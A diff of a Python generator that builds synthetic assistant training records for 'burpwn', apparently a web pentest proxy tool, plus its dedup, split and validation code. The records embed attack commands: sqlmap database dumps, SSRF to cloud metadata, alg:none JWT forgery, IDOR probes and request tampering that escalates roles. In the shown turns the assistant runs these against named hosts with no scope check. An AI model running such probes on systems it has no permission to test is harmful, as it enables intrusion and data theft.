+                        ("user", phr),
+                        (
+                            "assistant",
+                            f"```\nburpwn req list {fl}\n```\n\nAdd `--json` for the bare "
+                            "array of flow rows (newest first); each has `id`, `method`, "
+                            "`path`, `status`, `protocol`, `dst_ip`, `dst_port`, "
+                            "`ts_start`/`ts_end`.",
+                        ),
+                    ],
+                )
+            )
+    return out
+
+
+def fam_tag_note_sweep() -> list[dict[str, Any]]:
+    """flow x vuln-tag and note sweep with grounded envelopes."""
+    out: list[dict[str, Any]] = []
+    vulns = ["sqli", "xss", "idor", "bola", "ssrf", "csrf", "jwt", "open-redirect",
+             "lfi", "rce", "cmdi", "xxe", "ssti", "rate-limit"]
+    flow_ids = [3, 7, 9, 12, 14, 17, 22, 30, 31, 41, 44, 55, 63, 88]
+    for i, (fid, v) in enumerate(zip(flow_ids, vulns)):
+        out.append(
+            cli_example(
+                tags=["tag", "triage", "sweep", v],
+                turns=[
+                    (
+                        "user",
+                        [
+                            f"Tag flow {fid} as {v}.",
+                            f"Mark flow {fid} as a {v.upper()} candidate.",
+                            f"Flag flow {fid} for {v} so I can find it later.",
+                            f"Label flow {fid} {v}.",
+                        ][i % 4],
+                    ),
+                    (
+                        "assistant",
+                        f"```\nburpwn tag add {fid} {v}\n```\n\nReturns "
+                        f'`{{"ok":true,"data":{{"flow_id":{fid},"name":"{v}","tag_id":1}},'
+                        f'"error":null}}`. The tag is created on first use.',
+                    ),
+                ],
+            )
+        )
+    notes = [
+        (14, "id param reflects unescaped into SQL error message"),
+        (41, "/v1/me leaks numeric user id 1001 -> test IDOR on /v1/users/<id>"),
+        (22, "GET /orders/{id} returns other users' orders with own token (BOLA)"),
+        (17, "q param reflected unencoded into <script> (reflected XSS)"),
+        (9, "fetch?url= reaches 169.254.169.254 metadata (SSRF)"),
+        (44, "accepts alg:none JWT, returns admin data (signature not verified)"),
+        (30, "password change succeeds with CSRF token stripped"),
+        (88, "stack trace in 500 reveals framework + db driver"),
+    ]
+    for i, (fid, txt) in enumerate(notes):
+        out.append(
+            cli_example(
+                tags=["note", "triage", "sweep"],
+                turns=[
+                    (
+                        "user",
+                        [
+                            f"Add a note to flow {fid}: {txt}",
+                            f"Annotate flow {fid} with: {txt}",
+                            f"Record on flow {fid} that {txt}",
+                        ][i % 3],
+                    ),
+                    (
+                        "assistant",
+                        f'```\nburpwn note add {fid} "{txt}"\n```\n\nReturns '
+                        f'`{{"ok":true,"data":{{"flow_id":{fid},"note_id":1}},"error":null}}`. '
+                        "Args are `<FLOW_ID> <TEXT>`.",
+                    ),
+                ],
+            )
+        )
+    return out
+
+
+def fam_mcp_recon_sweep() -> list[dict[str, Any]]:
+    """MCP `exec` recon across target x tool x option — balances the cli sweep."""
+    out: list[dict[str, Any]] = []
+    base_ids = 30
+    n = 0
+    for ti, t in enumerate(TARGETS):
+        for tj, (tool, cmdpat, to, desc, _note) in enumerate(_RECON_TOOLS):
+            opts = _TOOL_OPTION_AXES.get(tool, [""])
+            for oi, opt in enumerate(opts):
+                base_cmd = cmdpat.format(base=t.base, host=t.host).replace("'", "")
+                if tool == "http":
+                    cmd = f"http {opt} {t.base}/api/health"
+                elif tool in ("curl", "wget"):
+                    url = base_cmd.rsplit(" ", 1)[-1]
+                    cmd = f"{tool} {opt} {url}".replace("  ", " ").strip()
+                else:
+                    cmd = f"{base_cmd} {opt}".strip()
+                # Drop the shell-format leftover braces from curl -w.
+                argv = [a for a in cmd.replace("%{{http_code}}", "%{http_code}").split() if a]
+                ids = [base_ids + n, base_ids + n + 1]
+                args: dict[str, Any] = {"argv": argv}
+                if to >= 120:
+                    args["timeout_secs"] = to
+                phr = [
+                    f"Run {tool} against {t.host} via the sandbox.",
+                    f"Use the exec tool to run {tool} on {t.host}.",
+                    f"Drive {tool} through burpwn against {t.host} and report captures.",
+                ][n % 3]
+                out.append(
+                    mcp_example(
+                        tags=["mcp", "exec", "recon", "sweep", tool, t.key],
+                        user=phr,
+                        steps=[{
+                            "tool": "exec", "args": args,
+                            "result": {"exit_code": 0, "captured_request_ids": ids,
+                                       "exec_id": f"exec-{ti}-{tj}{oi}-178140{ti}0000000000"},
+                            "final": f"{tool} ran cleanly (`exit_code:0`); captured flows "
+                                     f"{ids[0]}–{ids[-1]}. Use `req_list` with "
+                                     f"`{{\"host\":\"{t.host}\"}}` to review what it sent and "
+                                     "the live responses.",
+                        }],
+                    )
+                )
+                n += 1
+    return out
+
+
+def fam_mcp_query_sweep() -> list[dict[str, Any]]:
+    """MCP req_list / req_show / req_search sweep across targets x filters."""
+    out: list[dict[str, Any]] = []
+    list_filters = [
+        ({"status": 200}, "successful"),
+        ({"status": 403}, "forbidden (403)"),
+        ({"status": 500}, "erroring (500)"),
+        ({"method": "POST"}, "POST"),
+        ({"method": "GET", "status": 200}, "successful GET"),
+        ({"protocol": "h2"}, "HTTP/2"),
+        ({"limit": 10}, "the 10 newest"),
+    ]
+    searches = ["token", "password", "Bearer", "api_key", "csrf", "session", "admin"]
+    for ti, t in enumerate(TARGETS):
+        for fi, (extra, label) in enumerate(list_filters):
+            args = {"host": t.host, **extra}
+            status = extra.get("status", 200)
+            method = extra.get("method", "GET")
+            rows = [{"id": 40 + ti * 3 + fi, "authority": t.host, "method": method,
+                     "path": "/", "status": status, "protocol": t.protocol,
+                     "scheme": t.scheme, "dst_port": t.port}]
+            phr = [
+                f"List {label} flows to {t.host}.",
+                f"Show me the {label} requests on {t.host}.",
+                f"Which {label} flows hit {t.host}?",
+            ][(ti + fi) % 3]
+            out.append(
+                mcp_example(
+                    tags=["mcp", "req_list", "sweep", t.key],
+                    user=phr,
+                    steps=[{
+                        "tool": "req_list", "args": args,
+                        "result": {"flows": rows, "count": len(rows)},
+                        "final": f"`count`={len(rows)}: flow {rows[0]['id']} "
+                                 f"`{method} {t.host}/` → {status} over {t.protocol}. "
+                                 "`req_show` it for the decoded request/response.",
+                    }],
+                )
+            )
+        # one req_search per target (rotating query)
+        q = searches[ti % len(searches)]
+        out.append(
+            mcp_example(
+                tags=["mcp", "req_search", "sweep", t.key],
+                user=f"Search {t.host}'s captured traffic for '{q}'.",
+                steps=[{
+                    "tool": "req_search", "args": {"query": q},
+                    "result": {"flow_ids": [40 + ti, 12 + ti]},
+                    "final": f"Two flows mention '{q}': {40 + ti}, {12 + ti}. `req_show` "
+                             "either to read the match in context.",
+                }],
+            )
+        )
+        # one req_show per target
+        fid = 40 + ti
+        out.append(
+            mcp_example(
+                tags=["mcp", "req_show", "sweep", t.key],
+                user=f"Show me the decoded flow {fid} on {t.host}.",
+                steps=[{
+                    "tool": "req_show", "args": {"id": fid},
+                    "result": {"id": fid, "protocol": t.protocol, "scheme": t.scheme,
+                               "request": {"method": "GET", "authority": t.host, "path": "/"},
+                               "response": {"status": 200,
+                                            "headers": "content-type: text/html\r\n",
+                                            "body": "<!doctype html>..."}},
+                    "final": f"Flow {fid} is `GET {t.host}/` → 200 ({t.protocol}). The decoded "
+                             "request/response are in `request`/`response`; pass `raw:true` "
+                             "for the verbatim bytes.",
+                }],
+            )
+        )
+    return out
+
+
+def fam_recon_flag_variants() -> list[dict[str, Any]]:
+    """Same tools, but sweeping realistic flag/wordlist/output variations so the
+    model sees the breadth of how a given tool is invoked under `exec`."""
+    out: list[dict[str, Any]] = []
+    variants = [
+        ("ffuf",
+         ["ffuf -u {base}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404",
+          "ffuf -u {base}/api/FUZZ -w api-endpoints.txt -mc 200,401,403 -t 40",
+          "ffuf -u {base}/ -w params.txt -X POST -d 'FUZZ=test' -mc 200",
+          "ffuf -H 'Host: FUZZ.{host}' -u {base}/ -w subdomains.txt -fs 0"],
+         600, "fuzz"),
+        ("sqlmap",
+         ["sqlmap -u '{base}/item?id=1' --batch --dbs",
+          "sqlmap -u '{base}/login' --data 'user=a&pass=b' --batch --level 3 --risk 2",
+          "sqlmap -u '{base}/api/search?q=1' --batch --technique=BEUST --dump",
+          "sqlmap -r request.txt --batch --threads 4"],
+         900, "test for SQLi"),
+        ("nuclei",
+         ["nuclei -u {base} -t cves/ -silent",
+          "nuclei -u {base} -severity critical,high -silent",
+          "nuclei -u {base} -tags exposure,misconfig -silent",
+          "nuclei -l targets.txt -t http/ -rl 50 -silent"],
+         300, "scan"),
+        ("curl",
+         ["curl -s -X OPTIONS -i {base}/api/users",
+          "curl -s -H 'X-Forwarded-For: 127.0.0.1' {base}/admin",
+          "curl -s --http2 -I {base}/",
+          "curl -s -b 'session=abc' {base}/account"],
+         60, "request"),
+    ]
+    phr = [
+        "Run this {tool} command through burpwn: capture it.",
+        "I need to {desc} {host} with a specific {tool} invocation — sandbox it.",
+        "Wrap this {tool} run in burpwn exec against {host}.",
+        "Capture this {tool} command's traffic on {host}.",
+    ]
+    for ti, t in enumerate(TARGETS):
+        for vi, (tool, cmds, to, desc) in enumerate(variants):
+            cmd = cmds[(ti) % len(cmds)].format(base=t.base, host=t.host)
+            tc = f"--timeout {to} " if to >= 120 else ""
+            out.append(
+                cli_example(
+                    tags=["exec", "recon", "flags", tool, t.key],
+                    turns=[
+                        ("user",
+                         phr[(ti + vi) % len(phr)].format(tool=tool, host=t.host, desc=desc)
+                         + f"\n\n`{cmd}`"),
+                        ("assistant",
+                         f"Run it inside the sandbox so the egress is captured:\n\n```\n"
+                         f"burpwn exec {tc}-- {cmd}\n```\n\nEvery request it makes lands in "
+                         f"the session store; review with `burpwn req list --host {t.host}`."),
+                    ],
+                )
+            )
+    return out
+
+
+def fam_vuln_workflows_sweep() -> list[dict[str, Any]]:
+    """Per (target, vuln) multi-turn workflows: probe -> capture -> inspect ->
+    confirm -> tag/note. Distinct conversations, varied per target."""
+    out: list[dict[str, Any]] = []
+    specs = [
+        ("sqli", "SQL injection", "/product?id=1",
+         "curl -s \"{base}/product?id=1'\"",
+         "a SQL syntax error in the body",
+         "sqlmap -u '{base}/product?id=1' --batch"),
+        ("xss", "reflected XSS", "/search?q=",
+         "curl -s '{base}/search?q=probe9173'",
+         "the marker reflected unencoded into the HTML/JS",
+         None),
+        ("idor", "IDOR", "/api/account/1001",
+         "curl -s -H 'Authorization: Bearer $TOKEN' '{base}/api/account/1002'",
+         "another user's account data returned with your token",
+         None),
+        ("ssrf", "SSRF", "/fetch?url=",
+         "curl -s '{base}/fetch?url=http://169.254.169.254/latest/meta-data/'",
+         "cloud metadata content in the response",
+         None),
+        ("jwt", "a JWT verification flaw", "/api/me",
+         "curl -s -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.' '{base}/api/me'",
+         "admin data returned for an alg:none unsigned token",
+         None),
+    ]
+    wf_targets = [t for t in TARGETS if t.kind in ("webapp", "spa", "rest", "internal")]
+    fid = 100
+    for si, (vkey, vname, _ep, probecmd, signal, confirmcmd) in enumerate(specs):
+        for ti, t in enumerate(wf_targets):
+            fid += 1
+            probe = probecmd.format(base=t.base)
+            turns = [
+                ("user", [
+                    f"Let's test {t.host} for {vname}.",
+                    f"Walk me through checking {t.host} for {vname}.",
+                    f"I want to find {vname} on {t.host} — guide me.",
+                ][(si + ti) % 3]),
+                ("assistant",
+                 f"Plan: send a probe through the sandbox, find the captured flow, inspect "
+                 f"it, and confirm.\n\nStep 1 — probe:\n```\nburpwn exec -- {probe}\n```"),
+                ("user", f"Captured as flow {fid}. What now?"),
+                ("assistant",
+                 f"Inspect the decoded response and look for {signal}:\n```\n"
+                 f"burpwn req show {fid} --raw\n```\nAlso `burpwn --json req show {fid}` for "
+                 "the structured view (status, headers, body)."),
+                ("user", f"I see {signal}."),
+                ("assistant",
+                 (f"That confirms {vname}. " +
+                  (f"Now exploit/confirm it at scale:\n```\nburpwn exec --timeout 900 -- "
+                   f"{confirmcmd.format(base=t.base)}\n```\n" if confirmcmd else "") +
+                  f"Record the finding:\n```\nburpwn tag add {fid} {vkey}\nburpwn note add "
+                  f"{fid} \"confirmed {vname} on {t.host}\"\n```\nThen "
+                  f"`burpwn export har -o {t.key}-{vkey}.har` for the report evidence.")),
+            ]
+            out.append(
+                cli_example(
+                    tags=["workflow", "multi-step", "sweep", vkey, t.key],
+                    turns=turns,
+                )
+            )
+    return out
+
+
+def fam_mcp_tag_note_sweep() -> list[dict[str, Any]]:
+    """MCP tag_add / note_add / match_replace_add / workspace_new sweep."""
+    out: list[dict[str, Any]] = []
+    vulns = ["sqli", "xss", "idor", "ssrf", "jwt", "csrf", "open-redirect", "lfi"]
+    for i, v in enumerate(vulns):
+        fid = 40 + i
+        out.append(
+            mcp_example(
+                tags=["mcp", "tag_add", "sweep", v],
+                user=f"Tag flow {fid} as {v}.",
+                steps=[{
+                    "tool": "tag_add", "args": {"flow_id": fid, "name": v},
+                    "result": {"tag_id": i + 1},
+                    "final": f"Flow {fid} tagged `{v}` (tag_id {i + 1}). MCP `tag_add` "
+                             "returns just `{tag_id}`.",
+                }],
+            )
+        )
+        out.append(
+            mcp_example(
+                tags=["mcp", "note_add", "sweep", v],
+                user=f"Note on flow {fid} that it shows {v}.",
+                steps=[{
+                    "tool": "note_add",
+                    "args": {"flow_id": fid, "body": f"confirmed {v} on this flow"},
+                    "result": {"note_id": i + 1},
+                    "final": f"Note saved on flow {fid} (note_id {i + 1}). MCP arg is "
+                             "`body`.",
+                }],
+            )
+        )
+    # match_replace_add variants (scope x kind x direction)
+    mr = [
+        ("", "header", "Authorization", "Bearer eyJ...", True, "inject auth on all requests"),
+        ("*.acme.com", "body", "PRODUCTION", "STAGING", False, "rewrite responses for a host"),
+        ("api.shopwave.io", "header", "X-Forwarded-For", "127.0.0.1", True, "spoof XFF"),
+        ("", "url", "/v1/", "/internal/v1/", True, "rewrite the request path prefix"),
+        ("", "host", "www.acme.com", "staging.acme.com", True, "swap the target host"),
+    ]
+    for i, (scope, kind, pat, repl, onreq, desc) in enumerate(mr):
+        out.append(
+            mcp_example(
+                tags=["mcp", "match_replace_add", "sweep", kind],
+                user=f"Add a match/replace rule to {desc}.",
+                steps=[{
+                    "tool": "match_replace_add",
+                    "args": {"scope": scope, "kind": kind, "pattern": pat,
+                             "replacement": repl, "on_request": onreq},
+                    "result": {"id": i + 1},
+                    "final": f"Rule {i + 1} added ({'request' if onreq else 'response'} side, "
+                             f"kind `{kind}`, scope `{scope or 'all'}`). It applies while the "
+                             "session daemon runs.",
+                }],
+            )
+        )
+    return out
+
+
+def fam_mcp_intercept_sweep() -> list[dict[str, Any]]:
+    """MCP intercept tamper chains across targets/methods."""
+    out: list[dict[str, Any]] = []
+    cases = [
+        ("shopwave.io", "POST", "/cart/checkout",
+         [{"name": "X-Admin", "value": "true"}], '{"item":"sku-9","qty":99}',
+         "bump quantity and add an admin header"),
+        ("app.fintrack.dev", "POST", "/api/transfer",
+         [{"name": "X-Role", "value": "admin"}], '{"to":"acct-2","amount":1}',
+         "change the role header and amount"),
+        ("juice-shop.local", "PUT", "/api/Users/1",
+         [], '{"role":"admin"}', "escalate the role in the body"),
+        ("dvwa.local", "POST", "/vulnerabilities/csrf/",
+         [{"name": "X-Requested-With", "value": "XMLHttpRequest"}], None,
+         "add a header without touching the body"),
+    ]
+    for i, (host, method, path, headers, body, desc) in enumerate(cases):
+        steps = [
+            {"preamble": "Enable interception.", "tool": "intercept_enable", "args": {},
+             "result": {"ok": True},
+             "final": "Interception on. Long-polling for the next request."},
+            {"preamble": "Await the next parked request.", "tool": "await_intercept",
+             "args": {"timeout_secs": 60},
+             "result": {"pending": True, "intercept": {"id": 1, "kind": "request",
+                        "host": host, "method": method, "path": path}},
+             "final": f"Parked intercept 1: `{method} {host}{path}`. I'll {desc} and "
+                      "forward it."},
+        ]
+        fwd_args: dict[str, Any] = {"id": 1}
+        if headers:
+            fwd_args["set_headers"] = headers
+        if body is not None:
+            fwd_args["set_body"] = body
+        steps.append({
+            "preamble": "Forward with edits.", "tool": "intercept_forward",
+            "args": fwd_args, "result": {"found": True},
+            "final": f"Released intercept 1 ({desc}); `found:true`. The tampered request "
+                     "reached the server and is captured — `req_list` for its response.",
+        })
+        out.append(
+            mcp_example(
+                tags=["mcp", "multi-step", "intercept", "tamper", "sweep"],
+                user=f"Intercept the next {method} to {host}{path} and {desc}.",
+                steps=steps,
+            )
+        )
+    return out
+
+
+def fam_mcp_exec_flag_variants() -> list[dict[str, Any]]:
+    """MCP exec with specific multi-flag tool invocations (mirrors the CLI
+    flag-variant family) — distinct argv arrays per target."""
+    out: list[dict[str, Any]] = []
+    variants = [
+        ("ffuf", ["ffuf", "-u", "{base}/FUZZ", "-w", "raft-medium.txt", "-mc", "200,403"], 600),
+        ("ffuf", ["ffuf", "-u", "{base}/api/FUZZ", "-w", "api.txt", "-mc", "200,401", "-t", "40"], 600),
+        ("sqlmap", ["sqlmap", "-u", "{base}/item?id=1", "--batch", "--dbs"], 900),
+        ("sqlmap", ["sqlmap", "-u", "{base}/login", "--data", "user=a&pass=b", "--batch", "--level", "3"], 900),
+        ("nuclei", ["nuclei", "-u", "{base}", "-tags", "cve,exposure", "-silent"], 300),
+        ("nuclei", ["nuclei", "-u", "{base}", "-severity", "critical,high", "-silent"], 300),
+        ("curl", ["curl", "-s", "-X", "OPTIONS", "-i", "{base}/api/users"], 60),
+        ("curl", ["curl", "-s", "-H", "X-Forwarded-For: 127.0.0.1", "{base}/admin"], 60),
+        ("httpx", ["httpx", "-u", "{base}", "-sc", "-tech-detect", "-silent"], 120),
+        ("nmap", ["nmap", "-sT", "-Pn", "-p", "80,443,8080,8443", "{host}"], 900),
+    ]
+    base = 200
+    n = 0
+    for ti, t in enumerate(TARGETS):
+        for vi, (tool, argvpat, to) in enumerate(variants):
+            argv = [a.format(base=t.base, host=t.host) for a in argvpat]
+            args: dict[str, Any] = {"argv": argv}
+            if to >= 120:
+                args["timeout_secs"] = to
+            ids = [base + n, base + n + 1]
+            phr = [
+                f"Run this {tool} invocation against {t.host} via the exec tool.",
+                f"Use exec to drive {tool} with these flags on {t.host}.",
+                f"Sandbox this {tool} command targeting {t.host}.",
+            ][n % 3]
+            out.append(
+                mcp_example(
+                    tags=["mcp", "exec", "flags", tool, t.key],
+                    user=phr + f"\n\n`{' '.join(argv)}`",
+                    steps=[{
+                        "tool": "exec", "args": args,
+                        "result": {"exit_code": 0, "captured_request_ids": ids,
+                                   "exec_id": f"exec-f{ti}-{vi}-178141{ti}0000000000"},
+                        "final": f"{tool} ran (`exit_code:0`); captured flows "
+                                 f"{ids[0]}–{ids[-1]}. `req_list` with "
+                                 f"`{{\"host\":\"{t.host}\"}}` to review the requests and "
+                                 "responses.",
+                    }],
+                )
+            )
+            n += 1
+    return out
+
+
+# Assembly, dedup, split.
+# --------------------------------------------------------------------------- #
+
+FAMILIES = [
+    fam_setup,
+    fam_sessions,
+    fam_exec_recon,
+    fam_req_list,
+    fam_req_show_search,
+    fam_replay,
+    fam_intercept_cli,
+    fam_match_replace,
+    fam_tag_note_workspace,
+    fam_export,
+    fam_negatives,
+    fam_meta,
+    fam_cli_workflows,
+    fam_mcp_single,
+    fam_mcp_multi,
+    fam_recon_sweep,
+    fam_vuln_probe_sweep,
+    fam_req_list_sweep,
+    fam_tag_note_sweep,
+    fam_mcp_recon_sweep,
+    fam_mcp_query_sweep,
+    fam_recon_flag_variants,
+    fam_vuln_workflows_sweep,
+    fam_mcp_tag_note_sweep,
+    fam_mcp_intercept_sweep,
+    fam_mcp_exec_flag_variants,
+]
+
+
+def _normalized_key(rec: dict[str, Any]) -> str:
+    """Hash a record's semantic content (roles + content), ignoring volatile
+    fields like tags ordering and call ids, for near-duplicate detection."""
+    parts: list[str] = [rec["style"]]
+    for m in rec["messages"]:
+        role = m["role"]
+        content = (m.get("content") or "").strip()
+        # Fold tool_calls into the content signature (name + args), dropping ids.
+        tcs = m.get("tool_calls")
+        if tcs:
+            for tc in tcs:
+                fn = tc.get("function", {})
+                content += f"|TC:{fn.get('name')}:{fn.get('arguments')}"
+        if role == "tool":
+            content += f"|TOOLRES:{m.get('name')}:{m.get('content')}"
+        parts.append(f"{role}\x1f{content}")
+    blob = "\x1e".join(parts)
+    return hashlib.sha256(blob.encode("utf-8")).hexdigest()
+
+
+def build_dataset(target: int | None, seed: int) -> list[dict[str, Any]]:
+    """Generate all family records, dedup, and (optionally) cap to ~target with
+    a deterministic, balanced selection."""
+    records: list[dict[str, Any]] = []
+    for fam in FAMILIES:
+        records.extend(fam())
+
+    # Dedup by normalized content (keep first occurrence, stable order).
+    seen: set[str] = set()
+    unique: list[dict[str, Any]] = []
     for rec in records:
-        sys.stdout.write(json.dumps(rec, ensure_ascii=False, sort_keys=True))
-        sys.stdout.write("\n")
+        key = _normalized_key(rec)
+        if key in seen:
+            continue
+        seen.add(key)
+        unique.append(rec)
 
+    # If a smaller target is requested, deterministically subsample while keeping
+    # the cli/mcp balance roughly proportional. We never *pad*: target above the
+    # available count just returns everything (the families are the ceiling).
+    if target is not None and target < len(unique):
+        rng = random.Random(seed)
+        cli = [r for r in unique if r["style"] == "cli"]
+        mcp = [r for r in unique if r["style"] == "mcp"]
+        frac = target / len(unique)
+        n_cli = round(len(cli) * frac)
+        n_mcp = target - n_cli
+        n_mcp = min(n_mcp, len(mcp))
+        rng.shuffle(cli)
+        rng.shuffle(mcp)
+        chosen = set(id(r) for r in cli[:n_cli]) | set(id(r) for r in mcp[:n_mcp])
+        unique = [r for r in unique if id(r) in chosen]
+
+    return unique
+
+
+def split_dataset(
+    records: list[dict[str, Any]], seed: int, val_frac: float = 0.05
+) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
+    """Deterministic train/validation split, stratified by style so both files
+    contain cli + mcp examples."""
+    rng = random.Random(seed + 1)
+    train: list[dict[str, Any]] = []
+    val: list[dict[str, Any]] = []
+    for style in ("cli", "mcp"):
+        group = [r for r in records if r["style"] == style]
+        idx = list(range(len(group)))
+        rng.shuffle(idx)
+        n_val = max(1, round(len(group) * val_frac)) if group else 0
+        val_idx = set(idx[:n_val])
+        for i, r in enumerate(group):
+            (val if i in val_idx else train).append(r)
+    # Preserve a stable order within each split (by normalized key) for a
+    # reviewable, byte-identical diff.
+    train.sort(key=_normalized_key)
+    val.sort(key=_normalized_key)
+    return train, val
+
+
+def emit(records: Iterable[dict[str, Any]], fh) -> None:
+    for rec in records:
+        fh.write(json.dumps(rec, ensure_ascii=False, sort_keys=True))
+        fh.write("\n")
+
+
+# --------------------------------------------------------------------------- #
+# Validation.
+# --------------------------------------------------------------------------- #
 
 VALID_ROLES = {"system", "user", "assistant", "tool"}
 
 
+def _extract_commands(text: str) -> list[str]:
+    """Pull burpwn command lines out of fenced code blocks for the linter."""
+    cmds: list[str] = []
+    for line in text.splitlines():
+        s = line.strip()
+        if s.startswith("burpwn "):
+            cmds.append(s)
+    return cmds
+
+
+def _lint_cli_command(cmd: str) -> list[str]:
+    """Lenient check that a `burpwn …` command uses only known subcommands/flags.
+    Stops scanning at `--` (everything after is the sandboxed child command)."""
+    import shlex
+
+    errs: list[str] = []
+    # Strip quoted segments so values like a note body or header string aren't
+    # mis-read as flags. shlex tokenizes respecting quotes; we then only inspect
+    # tokens that the *source* presented bare (i.e. dash-led and unquoted).
+    try:
+        toks = shlex.split(cmd, comments=True)
+    except ValueError:
+        # Unbalanced quotes in illustrative text — skip linting this line.
+        return errs
+    # toks[0] == 'burpwn'
+    for tok in toks[1:]:
+        if tok == "--":
+            break  # child command follows; not burpwn's surface
+        # Only a token that *starts* with a dash in the raw command is a flag.
+        # After shlex, a quoted value loses its quotes, so guard against values
+        # that merely begin with '-' by also requiring it to look like a flag
+        # (alpha after the dashes).
+        if tok.startswith("--") and len(tok) > 2 and (tok[2].isalpha()):
+            flag = tok.split("=", 1)[0]
+            if flag not in KNOWN_CLI_FLAGS:
+                errs.append(f"unknown burpwn flag {flag!r} in: {cmd}")
+        elif tok.startswith("-") and len(tok) == 2 and tok[1].isalpha():
+            if tok not in KNOWN_CLI_FLAGS:
+                errs.append(f"unknown burpwn flag {tok!r} in: {cmd}")
+    return errs
+
+
 def validate_record(idx: int, rec: dict[str, Any]) -> list[str]:
-    """Return a list of human-readable problems with one record (empty = ok)."""
     errs: list[str] = []
 
     def err(msg: str) -> None:
@@ -1248,85 +3147,77 @@ def validate_record(idx: int, rec: dict[str, Any]) -> list[str]:
         err("last message must be role 'assistant'")
 
     if style == "cli":
-        if len(msgs) != 3:
-            err("cli style must have exactly 3 messages (system,user,assistant)")
-        if not msgs[-1].get("content", "").strip():
-            err("cli assistant content must be non-empty")
+        # Alternating user/assistant after the system turn, ending on assistant.
+        body = msgs[1:]
+        if len(body) % 2 != 0:
+            err("cli body (after system) must have an even number of turns")
+        for j, m in enumerate(body):
+            expect = "user" if j % 2 == 0 else "assistant"
+            if m.get("role") != expect:
+                err(f"cli turn {j + 1} must be {expect!r}, got {m.get('role')!r}")
+            if m.get("role") == "assistant" and not (m.get("content") or "").strip():
+                err(f"cli assistant turn {j + 1} content must be non-empty")
+        # Lint any burpwn commands in assistant turns.
+        for m in body:
+            if m.get("role") == "assistant":
+                for cmd in _extract_commands(m.get("content", "")):
+                    errs.extend(_lint_cli_command(cmd))
+
     elif style == "mcp":
-        # Expect: system, user, assistant(tool_calls), tool, assistant.
-        if len(msgs) != 5:
-            err("mcp style must have 5 messages (system,user,assistant,tool,assistant)")
+        # system, then repeating [assistant(tool_calls), tool, assistant].
+        body = msgs[1:]  # user, then triples
+        if not body or body[0].get("role") != "user":
+            err("mcp: second message must be 'user'")
             return errs
-        tc_msg = msgs[2]
-        if tc_msg.get("role") != "assistant" or "tool_calls" not in tc_msg:
-            err("mcp message 2 must be an assistant turn with 'tool_calls'")
-        else:
-            tcs = tc_msg["tool_calls"]
+        rest = body[1:]
+        if len(rest) % 3 != 0 or len(rest) < 3:
+            err("mcp: after user, messages must come in [assistant,tool,assistant] triples")
+            return errs
+        for t in range(0, len(rest), 3):
+            a_call, a_tool, a_final = rest[t], rest[t + 1], rest[t + 2]
+            if a_call.get("role") != "assistant" or "tool_calls" not in a_call:
+                err(f"mcp triple {t // 3}: first turn must be assistant with tool_calls")
+                continue
+            tcs = a_call["tool_calls"]
             if not isinstance(tcs, list) or len(tcs) != 1:
-                err("tool_calls must be a list with exactly one call")
-            else:
-                call = tcs[0]
-                fn = call.get("function", {})
-                if not call.get("id"):
-                    err("tool_call missing id")
-                if call.get("type") != "function":
-                    err("tool_call type must be 'function'")
-                if fn.get("name") not in MCP_TOOL_NAMES:
-                    err(f"unknown MCP tool name {fn.get('name')!r}")
-                args = fn.get("arguments")
-                if not isinstance(args, str):
-                    err("tool_call arguments must be a JSON string")
-                else:
-                    try:
-                        json.loads(args)
-                    except json.JSONDecodeError as e:
-                        err(f"tool_call arguments is not valid JSON: {e}")
-        tool_msg = msgs[3]
-        if tool_msg.get("role") != "tool":
-            err("mcp message 3 must be role 'tool'")
-        else:
-            if "tool_call_id" not in tool_msg:
-                err("tool message missing tool_call_id")
-            content = tool_msg.get("content")
-            if not isinstance(content, str):
-                err("tool message content must be a JSON string")
+                err(f"mcp triple {t // 3}: tool_calls must be a single-element list")
+                continue
+            call = tcs[0]
+            fn = call.get("function", {})
+            if not call.get("id"):
+                err(f"mcp triple {t // 3}: tool_call missing id")
+            if call.get("type") != "function":
+                err(f"mcp triple {t // 3}: tool_call type must be 'function'")
+            if fn.get("name") not in MCP_TOOL_NAMES:
+                err(f"mcp triple {t // 3}: unknown MCP tool {fn.get('name')!r}")
+            args = fn.get("arguments")
+            if not isinstance(args, str):
+                err(f"mcp triple {t // 3}: arguments must be a JSON string")
             else:
                 try:
-                    json.loads(content)
+                    json.loads(args)
                 except json.JSONDecodeError as e:
-                    err(f"tool message content is not valid JSON: {e}")
-            # cross-check ids/names line up
-            if "tool_calls" in tc_msg and isinstance(tc_msg["tool_calls"], list) and tc_msg["tool_calls"]:
-                call = tc_msg["tool_calls"][0]
-                if tool_msg.get("tool_call_id") != call.get("id"):
-                    err("tool_call_id does not match the assistant tool_call id")
-                if tool_msg.get("name") != call.get("function", {}).get("name"):
-                    err("tool message name does not match the called tool")
+                    err(f"mcp triple {t // 3}: arguments not valid JSON: {e}")
+            if a_tool.get("role") != "tool":
+                err(f"mcp triple {t // 3}: second turn must be role 'tool'")
+            else:
+                if a_tool.get("tool_call_id") != call.get("id"):
+                    err(f"mcp triple {t // 3}: tool_call_id mismatch")
+                if a_tool.get("name") != fn.get("name"):
+                    err(f"mcp triple {t // 3}: tool name mismatch")
+                tc = a_tool.get("content")
+                if not isinstance(tc, str):
+                    err(f"mcp triple {t // 3}: tool content must be a JSON string")
+                else:
+                    try:
+                        json.loads(tc)
+                    except json.JSONDecodeError as e:
+                        err(f"mcp triple {t // 3}: tool content not valid JSON: {e}")
+            if a_final.get("role") != "assistant":
+                err(f"mcp triple {t // 3}: third turn must be assistant")
+            elif not (a_final.get("content") or "").strip():
+                err(f"mcp triple {t // 3}: assistant interpretation must be non-empty")
     return errs
-
-
-# The 19 MCP tools exposed by `burpwn mcp` (verified against server.rs).
-MCP_TOOL_NAMES = {
-    "session_list",
-    "session_current",
-    "req_list",
-    "req_show",
-    "req_search",
-    "workspace_list",
-    "workspace_new",
-    "tag_list",
-    "tag_add",
-    "note_add",
-    "match_replace_list",
-    "match_replace_add",
-    "intercept_enable",
-    "intercept_disable",
-    "intercept_list",
-    "await_intercept",
-    "intercept_forward",
-    "intercept_drop",
-    "exec",
-}
 
 
 def run_validate(path: str) -> int:
@@ -1340,6 +3231,8 @@ def run_validate(path: str) -> int:
 
     problems: list[str] = []
     n_cli = n_mcp = 0
+    keys: dict[str, int] = {}
+    dupes = 0
     for idx, line in enumerate(lines, start=1):
         if not line.strip():
             continue
@@ -1355,6 +3248,14 @@ def run_validate(path: str) -> int:
